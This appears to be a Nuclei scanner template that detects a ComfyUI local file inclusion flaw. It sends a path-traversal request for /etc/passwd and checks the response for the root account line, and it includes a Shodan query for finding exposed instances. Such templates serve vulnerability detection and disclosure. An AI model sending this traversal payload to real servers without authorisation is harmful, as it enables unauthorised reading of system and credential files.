http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/../../../../../../../../../../etc/passwd'
id: comfyui-lfi
info:
  author: Co5mos
  description: ComfyUI is vulnerable to an unauthorized file read issue through follow_symlinks,
    allowing attackers to read sensitive files without authentication.
  metadata:
    shodan-query: ComfyUI
  name: ComfyUI follow_symlinks - Local File Inclusion
  reference:
  - https://avd.aliyun.com/detail?id=AVD-2024-1711503
  - https://github.com/comfyanonymous/ComfyUI/pull/2902
  severity: high
  tags: comfyui,lfi
